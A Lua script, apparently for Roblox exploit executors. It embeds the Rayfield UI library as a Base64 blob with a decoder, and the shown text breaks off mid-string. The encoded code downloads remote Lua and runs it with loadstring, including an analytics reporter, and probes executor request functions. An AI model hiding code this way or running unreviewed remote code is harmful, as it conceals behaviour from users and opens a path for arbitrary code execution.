-- Función para decodificar Base64
local b='ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/'
local function base64decode(data)
	data = string.gsub(data, '[^'..b..'=]', '')
	return (data:gsub('.', function(x)
		if x == '=' then return '' end
		local r,f='',(b:find(x)-1)
		for i=6,1,-1 do r=r..(f%2^i - f%2^(i-1) > 0 and '1' or '0') end
		return r
	end):gsub('%d%d%d?%d?%d?%d?%d?%d?', function(x)
		if #x ~= 8 then return '' end
		local c=0
		for i=1,8 do c=c + (x:sub(i,i)=='1' and 2^(8-i) or 0) end
		return string.char(c)
	end))
end

-- Script de Rayfield codificado en Base64 (aquí pegas tu string largo)
local encodedRayfield = [[
LS1bWwoKCVJheWZpZWxkIEludGVyZmFjZSBTdWl0ZQoJYnkgU2lyaXVzCgoJc2hsZXggfCBEZXNpZ25pbmcgKyBQcm9ncmFtbWluZwoJaVJheSAgfCBQcm9ncmFtbWluZwoJTWF4ICAgfCBQcm9ncmFtbWluZwoKXV0KCmlmIGRlYnVnWCB0aGVuCgl3YXJuKCdJbml0aWFsaXNpbmcgUmF5ZmllbGQnKQplbmQKCmxvY2FsIGZ1bmN0aW9uIGdldFNlcnZpY2UobmFtZSkKICAgIGxvY2FsIHNlcnZpY2UgPSBnYW1lOkdldFNlcnZpY2UobmFtZSkKICAgIHJldHVybiBpZiBjbG9uZXJlZiB0aGVuIGNsb25lcmVmKHNlcnZpY2UpIGVsc2Ugc2VydmljZQplbmQKCi0tIExvYWRzIGFuZCBleGVjdXRlcyBhIGZ1bmN0aW9uIGhvc3RlZCBvbiBhIHJlbW90ZSBVUkwuIENhbmNlbHMgdGhlIHJlcXVlc3QgaWYgdGhlIHJlcXVlc3RlZCBVUkwgdGFrZXMgdG9vIGxvbmcgdG8gcmVzcG9uZC4KLS0gRXJyb3JzIHdpdGggdGhlIGZ1bmN0aW9uIGFyZSBjYXVnaHQgYW5kIGxvZ2dlZCB0byB0aGUgb3V0cHV0CmxvY2FsIGZ1bmN0aW9uIGxvYWRXaXRoVGltZW91dCh1cmw6IHN0cmluZywgdGltZW91dDogbnVtYmVyPyk6IC4uLmFueQoJYXNzZXJ0KHR5cGUodXJsKSA9PSAic3RyaW5nIiwgIkV4cGVjdGVkIHN0cmluZywgZ290ICIgLi4gdHlwZSh1cmwpKQoJdGltZW91dCA9IHRpbWVvdXQgb3IgNQoJbG9jYWwgcmVxdWVzdENvbXBsZXRlZCA9IGZhbHNlCglsb2NhbCBzdWNjZXNzLCByZXN1bHQgPSBmYWxzZSwgbmlsCgoJbG9jYWwgcmVxdWVzdFRocmVhZCA9IHRhc2suc3Bhd24oZnVuY3Rpb24oKQoJCWxvY2FsIGZldGNoU3VjY2VzcywgZmV0Y2hSZXN1bHQgPSBwY2FsbChnYW1lLkh0dHBHZXQsIGdhbWUsIHVybCkgLS0gZ2FtZTpIdHRwR2V0KHVybCkKCQktLSBJZiB0aGUgcmVxdWVzdCBmYWlscyB0aGUgY29udGVudCBjYW4gYmUgZW1wdHksIGV2ZW4gaWYgZmV0Y2hTdWNjZXNzIGlzIHRydWUKCQlpZiBub3QgZmV0Y2hTdWNjZXNzIG9yICNmZXRjaFJlc3VsdCA9PSAwIHRoZW4KCQkJaWYgI2ZldGNoUmVzdWx0ID09IDAgdGhlbgoJCQkJZmV0Y2hSZXN1bHQgPSAiRW1wdHkgcmVzcG9uc2UiIC0tIFNldCB0aGUgZXJyb3IgbWVzc2FnZQoJCQllbmQKCQkJc3VjY2VzcywgcmVzdWx0ID0gZmFsc2UsIGZldGNoUmVzdWx0CgkJCXJlcXVlc3RDb21wbGV0ZWQgPSB0cnVlCgkJCXJldHVybgoJCWVuZAoJCWxvY2FsIGNvbnRlbnQgPSBmZXRjaFJlc3VsdCAtLSBGZXRjaGVkIGNvbnRlbnQKCQlsb2NhbCBleGVjU3VjY2VzcywgZXhlY1Jlc3VsdCA9IHBjYWxsKGZ1bmN0aW9uKCkKCQkJcmV0dXJuIGxvYWRzdHJpbmcoY29udGVudCkoKQoJCWVuZCkKCQlzdWNjZXNzLCByZXN1bHQgPSBleGVjU3VjY2VzcywgZXhlY1Jlc3VsdAoJCXJlcXVlc3RDb21wbGV0ZWQgPSB0cnVlCgllbmQpCgoJbG9jYWwgdGltZW91dFRocmVhZCA9IHRhc2suZGVsYXkodGltZW91dCwgZnVuY3Rpb24oKQoJCWlmIG5vdCByZXF1ZXN0Q29tcGxldGVkIHRoZW4KCQkJd2FybihgUmVxdWVzdCBmb3Ige3VybH0gdGltZWQgb3V0IGFmdGVyIHt0aW1lb3V0fSBzZWNvbmRzYCkKCQkJdGFzay5jYW5jZWwocmVxdWVzdFRocmVhZCkKCQkJcmVzdWx0ID0gIlJlcXVlc3QgdGltZWQgb3V0IgoJCQlyZXF1ZXN0Q29tcGxldGVkID0gdHJ1ZQoJCWVuZAoJZW5kKQoKCS0tIFdhaXQgZm9yIGNvbXBsZXRpb24gb3IgdGltZW91dAoJd2hpbGUgbm90IHJlcXVlc3RDb21wbGV0ZWQgZG8KCQl0YXNrLndhaXQoKQoJZW5kCgktLSBDYW5jZWwgdGltZW91dCB0aHJlYWQgaWYgc3RpbGwgcnVubmluZyB3aGVuIHJlcXVlc3QgY29tcGxldGVzCglpZiBjb3JvdXRpbmUuc3RhdHVzKHRpbWVvdXRUaHJlYWQpIH49ICJkZWFkIiB0aGVuCgkJdGFzay5jYW5jZWwodGltZW91dFRocmVhZCkKCWVuZAoJaWYgbm90IHN1Y2Nlc3MgdGhlbgoJCXdhcm4oYEZhaWxlZCB0byBwcm9jZXNzIHt1cmx9OiB7cmVzdWx0fWApCgllbmQKCXJldHVybiBpZiBzdWNjZXNzIHRoZW4gcmVzdWx0IGVsc2UgbmlsCmVuZAoKbG9jYWwgcmVxdWVzdHNEaXNhYmxlZCA9IHRydWUgLS1nZXRnZW52IGFuZCBnZXRnZW52KCkuRElTQUJMRV9SQVlGSUVMRF9SRVFVRVNUUwpsb2NhbCBJbnRlcmZhY2VCdWlsZCA9ICczSzNXJwpsb2NhbCBSZWxlYXNlID0gIkJ1aWxkIDEuNjcyIgpsb2NhbCBSYXlmaWVsZEZvbGRlciA9ICJSYXlmaWVsZCIKbG9jYWwgQ29uZmlndXJhdGlvbkZvbGRlciA9IFJheWZpZWxkRm9sZGVyLi4iL0NvbmZpZ3VyYXRpb25zIgpsb2NhbCBDb25maWd1cmF0aW9uRXh0ZW5zaW9uID0gIi5yZmxkIgpsb2NhbCBzZXR0aW5nc1RhYmxlID0gewoJR2VuZXJhbCA9IHsKCQktLSBpZiBuZWVkcyBiZSBpbiBvcmRlciBqdXN0IG1ha2UgZ2V0U2V0dGluZyhuYW1lKQoJCXJheWZpZWxkT3BlbiA9IHtUeXBlID0gJ2JpbmQnLCBWYWx1ZSA9ICdLJywgTmFtZSA9ICdSYXlmaWVsZCBLZXliaW5kJ30sCgkJLS0gYnVpbGR3YXJuaW5ncwoJCS0tIHJheWZpZWxkcHJvbXB0cwoKCX0sCglTeXN0ZW0gPSB7CgkJdXNhZ2VBbmFseXRpY3MgPSB7VHlwZSA9ICd0b2dnbGUnLCBWYWx1ZSA9IHRydWUsIE5hbWUgPSAnQW5vbnltaXNlZCBBbmFseXRpY3MnfSwKCX0KfQoKbG9jYWwgSHR0cFNlcnZpY2UgPSBnZXRTZXJ2aWNlKCdIdHRwU2VydmljZScpCmxvY2FsIFJ1blNlcnZpY2UgPSBnZXRTZXJ2aWNlKCdSdW5TZXJ2aWNlJykKCi0tIEVudmlyb25tZW50IENoZWNrCmxvY2FsIHVzZVN0dWRpbyA9IFJ1blNlcnZpY2U6SXNTdHVkaW8oKSBvciBmYWxzZQoKbG9jYWwgc2V0dGluZ3NDcmVhdGVkID0gZmFsc2UKbG9jYWwgY2FjaGVkU2V0dGluZ3MKLS1sb2NhbCBwcm9tcHQgPSB1c2VTdHVkaW8gYW5kIHJlcXVpcmUoc2NyaXB0LlBhcmVudC5wcm9tcHQpIG9yIGxvYWRXaXRoVGltZW91dCgnaHR0cHM6Ly9yYXcuZ2l0aHVidXNlcmNvbnRlbnQuY29tL1Npcml1c1NvZnR3YXJlTHRkL1Npcml1cy9yZWZzL2hlYWRzL3JlcXVlc3QvcHJvbXB0Lmx1YScpCmxvY2FsIHJlcXVlc3QgPSAoc3luIGFuZCBzeW4ucmVxdWVzdCkgb3IgKGZsdXh1cyBhbmQgZmx1eHVzLnJlcXVlc3QpIG9yIChodHRwIGFuZCBodHRwLnJlcXVlc3QpIG9yIGh0dHBfcmVxdWVzdCBvciByZXF1ZXN0CgoKCmxvY2FsIGZ1bmN0aW9uIGxvYWRTZXR0aW5ncygpCglsb2NhbCBmaWxlID0gbmlsCgkKCWxvY2FsIHN1Y2Nlc3MsIHJlc3VsdCA9CXBjYWxsKGZ1bmN0aW9uKCkKCQl0YXNrLnNwYXduKGZ1bmN0aW9uKCkKCQkJaWYgaXNmb2xkZXIgYW5kIGlzZm9sZGVyKFJheWZpZWxkRm9sZGVyKSB0aGVuCgkJCQlpZiBpc2ZpbGUgYW5kIGlzZmlsZShSYXlmaWVsZEZvbGRlci4uJy9zZXR0aW5ncycuLkNvbmZpZ3VyYXRpb25FeHRlbnNpb24pIHRoZW4KCQkJCQlmaWxlID0gcmVhZGZpbGUoUmF5ZmllbGRGb2xkZXIuLicvc2V0dGluZ3MnLi5Db25maWd1cmF0aW9uRXh0ZW5zaW9uKQoJCQkJZW5kCgkJCWVuZAoKCQkJLS0gZm9yIGRlYnVnIGluIHN0dWRpbwoJCQlpZiB1c2VTdHVkaW8gdGhlbgoJCQkJZmlsZSA9IFtbCgkJeyJHZW5lcmFsIjp7InJheWZpZWxkT3BlbiI6eyJWYWx1ZSI6IksiLCJUeXBlIjoiYmluZCIsIk5hbWUiOiJSYXlmaWVsZCBLZXliaW5kIiwiRWxlbWVudCI6eyJIb2xkVG9JbnRlcmFjdCI6ZmFsc2UsIkV4dCI6dHJ1ZSwiTmFtZSI6IlJheWZpZWxkIEtleWJpbmQiLCJTZXQiOm51bGwsIkNhbGxPbkNoYW5nZSI6dHJ1ZSwiQ2FsbGJhY2siOm51bGwsIkN1cnJlbnRLZXliaW5kIjoiSyJ9fX0sIlN5c3RlbSI6eyJ1c2FnZUFuYWx5dGljcyI6eyJWYWx1ZSI6ZmFsc2UsIlR5cGUiOiJ0b2dnbGUiLCJOYW1lIjoiQW5vbnltaXNlZCBBbmFseXRpY3MiLCJFbGVtZW50Ijp7IkV4dCI6dHJ1ZSwiTmFtZSI6IkFub255bWlzZWQgQW5hbHl0aWNzIiwiU2V0IjpudWxsLCJDdXJyZW50VmFsdWUiOmZhbHNlLCJDYWxsYmFjayI6bnVsbH19fX0KCV1dCgkJCWVuZAoKCgkJCWlmIGZpbGUgdGhlbgoJCQkJbG9jYWwgc3VjY2VzcywgZGVjb2RlZEZpbGUgPSBwY2FsbChmdW5jdGlvbigpIHJldHVybiBIdHRwU2VydmljZTpKU09ORGVjb2RlKGZpbGUpIGVuZCkKCQkJCWlmIHN1Y2Nlc3MgdGhlbgoJCQkJCWZpbGUgPSBkZWNvZGVkRmlsZQoJCQkJZWxzZQoJCQkJCWZpbGUgPSB7fQoJCQkJZW5kCgkJCWVsc2UKCQkJCWZpbGUgPSB7fQoJCQllbmQKCgoJCQlpZiBub3Qgc2V0dGluZ3NDcmVhdGVkIHRoZW4gCgkJCQljYWNoZWRTZXR0aW5ncyA9IGZpbGUKCQkJCXJldHVybgoJCQllbmQKCgkJCWlmIGZpbGUgfj0ge30gdGhlbgoJCQkJZm9yIGNhdGVnb3J5TmFtZSwgc2V0dGluZ0NhdGVnb3J5IGluIHBhaXJzKHNldHRpbmdzVGFibGUpIGRvCgkJCQkJaWYgZmlsZVtjYXRlZ29yeU5hbWVdIHRoZW4KCQkJCQkJZm9yIHNldHRpbmdOYW1lLCBzZXR0aW5nIGluIHBhaXJzKHNldHRpbmdDYXRlZ29yeSkgZG8KCQkJCQkJCWlmIGZpbGVbY2F0ZWdvcnlOYW1lXVtzZXR0aW5nTmFtZV0gdGhlbgoJCQkJCQkJCXNldHRpbmcuVmFsdWUgPSBmaWxlW2NhdGVnb3J5TmFtZV1bc2V0dGluZ05hbWVdLlZhbHVlCgkJCQkJCQkJc2V0dGluZy5FbGVtZW50OlNldChzZXR0aW5nLlZhbHVlKQoJCQkJCQkJZW5kCgkJCQkJCWVuZAoJCQkJCWVuZAoJCQkJZW5kCgkJCWVuZAoJCWVuZCkKCWVuZCkKCQoJaWYgbm90IHN1Y2Nlc3MgdGhlbiAKCQlpZiB3cml0ZWZpbGUgdGhlbgoJCQl3YXJuKCdSYXlmaWVsZCBoYWQgYW4gaXNzdWUgYWNjZXNzaW5nIGNvbmZpZ3VyYXRpb24gc2F2aW5nIGNhcGFiaWxpdHkuJykKCQllbmQKCWVuZAplbmQKCmlmIGRlYnVnWCB0aGVuCgl3YXJuKCdOb3cgTG9hZGluZyBTZXR0aW5ncyBDb25maWd1cmF0aW9uJykKZW5kCgpsb2FkU2V0dGluZ3MoKQoKaWYgZGVidWdYIHRoZW4KCXdhcm4oJ1NldHRpbmdzIExvYWRlZCcpCmVuZAoKLS1pZiBub3QgY2FjaGVkU2V0dGluZ3Mgb3Igbm90IGNhY2hlZFNldHRpbmdzLlN5c3RlbSBvciBub3QgY2FjaGVkU2V0dGluZ3MuU3lzdGVtLnVzYWdlQW5hbHl0aWNzIHRoZW4KLS0JbG9jYWwgZmlsZUZ1bmN0aW9uc0F2YWlsYWJsZSA9IGlzZmlsZSBhbmQgd3JpdGVmaWxlIGFuZCByZWFkZmlsZQoKLS0JaWYgbm90IGZpbGVGdW5jdGlvbnNBdmFpbGFibGUgYW5kIG5vdCB1c2VTdHVkaW8gdGhlbgotLQkJd2FybignUmF5ZmllbGQgSW50ZXJmYWNlIFN1aXRlIHwgU2lyaXVzIEFuYWx5dGljczpcblxuXG5BcyB5b3UgZG9uXCd0IGhhdmUgZmlsZSBmdW5jdGlvbmFsaXR5IHdpdGggeW91ciBleGVjdXRvciwgd2UgYXJlIHVuYWJsZSB0byBzYXZlIHdoZXRoZXIgeW91IHdhbnQgdG8gb3B0IGluIG9yIG91dCB0byBhbmFseXRpY3MuXG5JZiB5b3UgZG8gbm90IHdhbnQgdG8gdGFrZSBwYXJ0IGluIGFub255bWlzZWQgdXNhZ2Ugc3RhdGlzdGljcywgbGV0IHVzIGtub3cgaW4gb3VyIERpc2NvcmQgYXQgc2lyaXVzLm1lbnUvZGlzY29yZCBhbmQgd2Ugd2lsbCBtYW51YWxseSBvcHQgeW91IG91dC4nKQotLQkJYW5hbHl0aWNzID0gdHJ1ZQkKLS0JZWxzZQotLQkJcHJvbXB0LmNyZWF0ZSgKLS0JCQknSGVscCB1cyBpbXByb3ZlJywKLS0JICAgICAgICAgICAgW1tXb3VsZCB5b3UgbGlrZSB0byBhbGxvdyBTaXJpdXMgdG8gY29sbGVjdCB1c2FnZSBzdGF0aXN0aWNzPwoKLS08Zm9udCB0cmFuc3BhcmVuY3k9JzAuNCc+Tm8gZGF0YSBpcyBsaW5rZWQgdG8geW91IG9yIHlvdXIgcGVyc29uYWwgYWN0aXZpdHkuPC9mb250Pl1dLAotLQkJCSdDb250aW51ZScsCi0tCQkJJ0NhbmNlbCcsCi0tCQkJZnVuY3Rpb24ocmVzdWx0KQotLQkJCQlzZXR0aW5nc1RhYmxlLlN5c3RlbS51c2FnZUFuYWx5dGljcy5WYWx1ZSA9IHJlc3VsdAotLQkJCQlhbmFseXRpY3MgPSByZXN1bHQKLS0JCQllbmQKLS0JCSkKLS0JZW5kCgotLQlyZXBlYXQgdGFzay53YWl0KCkgdW50aWwgYW5hbHl0aWNzIH49IG5pbAotLWVuZAoKaWYgbm90IHJlcXVlc3RzRGlzYWJsZWQgdGhlbgoJaWYgZGVidWdYIHRoZW4KCQl3YXJuKCdRdWVyeWluZyBTZXR0aW5ncyBmb3IgUmVwb3J0ZXIgSW5mb3JtYXRpb24nKQoJZW5kCglsb2NhbCBmdW5jdGlvbiBzZW5kUmVwb3J0KCkKCQlpZiB1c2VTdHVkaW8gdGhlbgoJCQlwcmludCgnU2VuZGluZyBBbmFseXRpY3MnKQoJCWVsc2UKCQkJaWYgZGVidWdYIHRoZW4gd2FybignUmVwb3J0aW5nIEFuYWx5dGljcycpIGVuZAoJCQl0YXNrLnNwYXduKGZ1bmN0aW9uKCkKCQkJCWxvY2FsIHN1Y2Nlc3MsIHJlcG9ydGVyID0gcGNhbGwoZnVuY3Rpb24oKQoJCQkJCXJldHVybiBsb2Fkc3RyaW5nKGdhbWU6SHR0cEdldCgiaHR0cHM6Ly9hbmFseXRpY3Muc2lyaXVzLm1lbnUvdjEvcmVwb3J0ZXIiLCB0cnVlKSkoKQoJCQkJZW5kKQoJCQkJaWYgc3VjY2VzcyBhbmQgcmVwb3J0ZXIgdGhlbgoJCQkJCXBjYWxsKGZ1bmN0aW9uKCkKCQkJCQkJcmVwb3J0ZXIucmVwb3J0KCJSYXlmaWVsZCIsIFJlbGVhc2UsIEludGVyZmFjZUJ1aWxkKQoJCQkJCWVuZCkKCQkJCWVsc2UKCQkJCQl3YXJuKCJGYWlsZWQgdG8gbG9hZCBvciBleGVjdXRlIHRoZSByZXBvcnRlci4gXG5QbGVhc2Ugbm90aWZ5IFJheWZpZWxkIGRldmVsb3BlcnMgYXQgc2lyaXVzLm1lbnUvZGlzY29yZC4iKQoJCQkJZW5kCgkJCWVuZCkKCQkJaWYgZGVidWdYIHRoZW4gd2FybignRmluaXNoZWQgUmVwb3J0JykgZW5kCgkJZW5kCgllbmQKCWlmIGNhY2hlZFNldHRpbmdzIGFuZCAoI2NhY2hlZFNldHRpbmdzID09IDAgb3IgKGNhY2hlZFNldHRpbmdzLlN5c3RlbSBhbmQgY2FjaGVkU2V0dGluZ3MuU3lzdGVtLnVzYWdlQW5hbHl0aWNzIGFuZCBjYWNoZWRTZXR0aW5ncy5TeXN0ZW0udXNhZ2VBbmFseXRpY3MuVmFsdWUpKSB0aGVuCgkJc2VuZFJlcG9ydCgpCgllbHNlaWYgbm90IGNhY2hlZFNldHRpbmdzIHRoZW4KCQlzZW5kUmVwb3J0KCkKCWVuZAplbmQKCmlmIGRlYnVnWCB0aGVuCgl3YXJuKCdNb3Zpbmcgb24gdG8gY29udGludWUgaW5pdGlhbGlzYXRpb24nKQplbmQKCmxvY2FsIFJheWZpZWxkTGlicmFyeSA9IHsKCUZsYWdzID0ge30sCglUaGVtZSA9IHsKCQlEZWZhdWx0ID0gewoJCQlUZXh0Q29sb3IgPSBDb2xvcjMuZnJvbVJHQigyNDAsIDI0MCwgMjQwKSwKCgkJCUJhY2tncm91bmQgPSBDb2xvcjMuZnJvbVJHQigyNSwgMjUsIDI1KSwKCQkJVG9wYmFyID0gQ29sb3IzLmZyb21SR0IoMzQsIDM0LCAzNCksCgkJCVNoYWRvdyA9IENvbG9yMy5mcm9tUkdCKDIwLCAyMCwgMjApLAoKCQkJTm90aWZpY2F0aW9uQmFja2dyb3VuZCA9IENvbG9yMy5mcm9tUkdCKDIwLCAyMCwgMjApLAoJCQlOb3RpZmljYXRpb25BY3Rpb25zQmFja2dyb3VuZCA9IENvbG9yMy5mcm9tUkdCKDIzMCwgMjMwLCAyMzApLAoKCQkJVGFiQmFja2dyb3VuZCA9IENvbG9yMy5mcm9tUkdCKDgwLCA4MCwgODApLAoJCQlUYWJTdHJva2UgPSBDb2xvcjMuZnJvbVJHQig4NSwgODUsIDg1KSwKCQkJVGFiQmFja2dyb3VuZFNlbGVjdGVkID0gQ29sb3IzLmZyb21SR0IoMjEwLCAyMTAsIDIxMCksCgkJCVRhYlRleHRDb2xvciA9IENvbG9yMy5mcm9tUkdCKDI0MCwgMjQwLCAyNDApLAoJCQlTZWxlY3RlZFRhYlRleHRDb2xvciA9IENvbG9yMy5mcm9tUkdCKDUwLCA1MCwgNTApLAoKCQkJRWxlbWVudEJhY2tncm91bmQgPSBDb2xvcjMuZnJvbVJHQigzNSwgMzUsIDM1KSwKCQkJRWxlbWVudEJhY2tncm91bmRIb3ZlciA9IENvbG9yMy5mcm9tUkdCKDQwLCA0MCwgNDApLAoJCQlTZWNvbmRhcnlFbGVtZW50QmFja2dyb3VuZCA9IENvbG9yMy5mcm9tUkdCKDI1LCAyNSwgMjUpLAoJCQlFbGVtZW50U3Ryb2tlID0gQ29sb3IzLmZyb21SR0IoNTAsIDUwLCA1MCksCgkJCVNlY29uZGFyeUVsZW1lbnRTdHJva2UgPSBDb2xvcjMuZnJvbVJHQig0MCwgNDAsIDQwKSwKCgkJCVNsaWRlckJhY2tncm91bmQgPSBDb2xvcjMuZnJvbVJHQig1MCwgMTM4LCAyMjApLAoJCQlTbGlkZXJQcm9ncmVzcyA9IENvbG9yMy5mcm9tUkdCKDUwLCAxMzgsIDIyMCksCgkJCVNsaWRlclN0cm9rZSA9IENvbG9yMy5mcm9tUkdCKDU4LCAxNjMsIDI1NSksCgoJCQlUb2dnbGVCYWNrZ3JvdW5kID0gQ29sb3IzLmZyb21SR0IoMzAsIDMwLCAzMCksCgkJCVRvZ2dsZUVuYWJsZWQgPSBDb2xvcjMuZnJvbVJHQigwLCAxNDYsIDIxNCksCgkJCVRvZ2dsZURpc2FibGVkID0gQ29sb3IzLmZyb21SR0IoMTAwLCAxMDAsIDEwMCksCgkJCVRvZ2dsZUVuYWJsZWRTdHJva2UgPSBDb2xvcjMuZnJvbVJHQigwLCAxNzAsIDI1NSksCgkJCVRvZ2dsZURpc2FibGVkU3Ryb2tlID0gQ29sb3IzLmZyb21SR0IoMTI1LCAxMjUsIDEyNSksCgkJCVRvZ2dsZUVuYWJsZWRPdXRlclN0cm9rZSA9IENvbG9yMy5mcm9tUkdCKDEwMCwgMTAwLCAxMDApLAoJCQlUb2dnbGVEaXNhYmxlZE91dGVyU3Ryb2tlID0gQ29sb3IzLmZyb21SR0IoNjUsIDY1LCA2NSksCgoJCQlEcm9wZG93blNlbGVjdGVkID0gQ29sb3IzLmZyb21SR0IoNDAsIDQwLCA0MCksCgkJCURyb3Bkb3duVW5zZWxlY3RlZCA9IENvbG9yMy5mcm9tUkdCKDMwLCAzMCwgMzApLAoKCQkJSW5wdXRCYWNrZ3JvdW5kID0gQ29sb3IzLmZyb21SR0IoMzAsIDMwLCAzMCksCgkJCUlucHV0U3Ryb2tlID0gQ29sb3IzLmZyb21SR0IoNjUsIDY1LCA2NSksCgkJCVBsYWNlaG9sZGVyQ29sb3IgPSBDb2xvcjMuZnJvbVJHQigxNzgsIDE3OCwgMTc4KQoJCX0sCgoJCU9jZWFuID0gewoJCQlUZXh0Q29sb3IgPSBDb2xvcjMuZnJvbVJHQigyMzAsIDI0MCwgMjQwKSwKCgkJCUJhY2tncm91bmQgPSBDb2xvcjMuZnJvbVJHQigyMCwgMzAsIDMwKSwKCQkJVG9wYmFyID0gQ29sb3IzLmZyb21SR0IoMjUsIDQwLCA0MCksCgkJCVNoYWRvdyA9IENvbG9yMy5mcm9tUkdCKDE1LCAyMCwgMjApLAoKCQkJTm90aWZpY2F0aW9uQmFja2dyb3VuZCA9IENvbG9yMy5mcm9tUkdCKDI1LCAzNSwgMzUpLAoJCQlOb3RpZmljYXRpb25BY3Rpb25zQmFja2dyb3VuZCA9IENvbG9yMy5mcm9tUkdCKDIzMCwgMjQwLCAyNDApLAoKCQkJVGFiQmFja2dyb3VuZCA9IENvbG9yMy5mcm9tUkdCKDQwLCA2MCwgNjApLAoJCQlUYWJTdHJva2UgPSBDb2xvcjMuZnJvbVJHQig1MCwgNzAsIDcwKSwKCQkJVGFiQmFja2dyb3VuZFNlbGVjdGVkID0gQ29sb3IzLmZyb21SR0IoMTAwLCAxODAsIDE4MCksCgkJCVRhYlRleHRDb2xvciA9IENvbG9yMy5mcm9tUkdCKDIxMCwgMjMwLCAyMzApLAoJCQlTZWxlY3RlZFRhYlRleHRDb2xvciA9IENvbG9yMy5mcm9tUkdCKDIwLCA1MCwgNTApLAoKCQkJRWxlbWVudEJhY2tncm91bmQgPSBDb2xvcjMuZnJvbVJHQigzMCwgNTAsIDUwKSwKCQkJRWxlbWVudEJhY2tncm91bmRIb3ZlciA9IENvbG9yMy5mcm9tUkdCKDQwLCA2MCwgNjApLAoJCQlTZWNvbmRhcnlFbGVtZW50QmFja2dyb3VuZCA9IENvbG9yMy5mcm9tUkdCKDMwLCA0NSwgNDUpLAoJCQlFbGVtZW50U3Ryb2tlID0gQ29sb3IzLmZyb21SR0IoNDUsIDcwLCA3MCksCgkJCVNlY29uZGFyeUVsZW1lbnRTdHJva2UgPSBDb2xvcjMuZnJvbVJHQig0MCwgNjUsIDY1KSwKCgkJCVNsaWRlckJhY2tncm91bmQgPSBDb2xvcjMuZnJvbVJHQigwLCAxMTAsIDExMCksCgkJCVNsaWRlclByb2dyZXNzID0gQ29sb3IzLmZyb21SR0IoMCwgMTQwLCAxNDApLAoJCQlTbGlkZXJTdHJva2UgPSBDb2xvcjMuZnJvbVJHQigwLCAxNjAsIDE2MCksCgoJCQlUb2dnbGVCYWNrZ3JvdW5kID0gQ29sb3IzLmZyb21SR0IoMzAsIDUwLCA1MCksCgkJCVRvZ2dsZUVuYWJsZWQgPSBDb2xvcjMuZnJvbVJHQigwLCAxMzAsIDEzMCksCgkJCVRvZ2dsZURpc2FibGVkID0gQ29sb3IzLmZyb21SR0IoNzAsIDkwLCA5MCksCgkJCVRvZ2dsZUVuYWJsZWRTdHJva2UgPSBDb2xvcjMuZnJvbVJHQigwLCAxNjAsIDE2MCksCgkJCVRvZ2dsZURpc2FibGVkU3Ryb2tlID0gQ29sb3IzLmZyb21SR0IoODUsIDEwNSwgMTA1KSwKCQkJVG9nZ2xlRW5hYmxlZE91dGVyU3Ryb2tlID0gQ29sb3IzLmZyb21SR0IoNTAsIDEwMCwgMTAwKSwKCQkJVG9nZ2xlRGlzYWJsZWRPdXRlclN0cm9rZSA9IENvbG9yMy5mcm9tUkdCKDQ1LCA2NSwgNjUpLAoKCQkJRHJvcGRvd25TZWxlY3RlZCA9IENvbG9yMy5mcm9tUkdCKDMwLCA2MCwgNjApLAoJCQlEcm9wZG93blVuc2VsZWN0ZWQgPSBDb2xvcjMuZnJvbVJHQigyNSwgNDAsIDQwKSwKCgkJCUlucHV0QmFja2dyb3VuZCA9IENvbG9yMy5mcm9tUkdCKDMwLCA1MCwgNTApLAoJCQlJbnB1dFN0cm9rZSA9IENvbG9yMy5mcm9tUkdCKDUwLCA3MCwgNzApLAoJCQlQbGFjZWhvbGRlckNvbG9yID0gQ29sb3IzLmZyb21SR0IoMTQwLCAxNjAsIDE2MCkKCQl9LAoKCQlBbWJlckdsb3cgPSB7CgkJCVRleHRDb2xvciA9IENvbG9yMy5mcm9tUkdCKDI1NSwgMjQ1LCAyMzApLAoKCQkJQmFja2dyb3VuZCA9IENvbG9yMy5mcm9tUkdCKDQ1LCAzMCwgMjApLAoJCQlUb3BiYXIgPSBDb2xvcjMuZnJvbVJHQig1NSwgNDAsIDI1KSwKCQkJU2hhZG93ID0gQ29sb3IzLmZyb21SR0IoMzUsIDI1LCAxNSksCgoJCQlOb3RpZmljYXRpb25CYWNrZ3JvdW5kID0gQ29sb3IzLmZyb21SR0IoNTAsIDM1LCAyNSksCgkJCU5vdGlmaWNhdGlvbkFjdGlvbnNCYWNrZ3JvdW5kID0gQ29sb3IzLmZyb21SR0IoMjQ1LCAyMzAsIDIxNSksCgoJCQlUYWJCYWNrZ3JvdW5kID0gQ29sb3IzLmZyb21SR0IoNzUsIDUwLCAzNSksCgkJCVRhYlN0cm9rZSA9IENvbG9yMy5mcm9tUkdCKDkwLCA2MCwgNDUpLAoJCQlUYWJCYWNrZ3JvdW5kU2VsZWN0ZWQgPSBDb2xvcjMuZnJvbVJHQigyMzAsIDE4MCwgMTAwKSwKCQkJVGFiVGV4dENvbG9yID0gQ29sb3IzLmZyb21SR0IoMjUwLCAyMjAsIDIwMCksCgkJCVNlbGVjdGVkVGFiVGV4dENvbG9yID0gQ29sb3IzLmZyb21SR0IoNTAsIDMwLCAxMCksCgoJCQlFbGVtZW50QmFja2dyb3VuZCA9IENvbG9yMy5mcm9tUkdCKDYwLCA0NSwgMzUpLAoJCQlFbGVtZW50QmFja2dyb3VuZEhvdmVyID0gQ29sb3IzLmZyb21SR0IoNzAsIDUwLCA0MCksCgkJCVNlY29uZGFyeUVsZW1lbnRCYWNrZ3JvdW5kID0gQ29sb3IzLmZyb21SR0IoNTUsIDQwLCAzMCksCgkJCUVsZW1lbnRTdHJva2UgPSBDb2xvcjMuZnJvbVJHQig4NSwgNjAsIDQ1KSwKCQkJU2Vjb25kYXJ5RWxlbWVudFN0cm9rZSA9IENvbG9yMy5mcm9tUkdCKDc1LCA1MCwgMzUpLAoKCQkJU2xpZGVyQmFja2dyb3VuZCA9IENvbG9yMy5mcm9tUkdCKDIyMCwgMTMwLCA2MCksCgkJCVNsaWRlclByb2dyZXNzID0gQ29sb3IzLmZyb21SR0IoMjUwLCAxNTAsIDc1KSwKCQkJU2xpZGVyU3Ryb2tlID0gQ29sb3IzLmZyb21SR0IoMjU1LCAxNzAsIDg1KSwKCgkJCVRvZ2dsZUJhY2tncm91bmQgPSBDb2xvcjMuZnJvbVJHQig1NSwgNDAsIDMwKSwKCQkJVG9nZ2xlRW5hYmxlZCA9IENvbG9yMy5mcm9tUkdCKDI0MCwgMTMwLCAzMCksCgkJCVRvZ2dsZURpc2FibGVkID0gQ29sb3IzLmZyb21SR0IoOTAsIDcwLCA2MCksCgkJCVRvZ2dsZUVuYWJsZWRTdHJva2UgPSBDb2xvcjMuZnJvbVJHQigyNTUsIDE2MCwgNTApLAoJCQlUb2dnbGVEa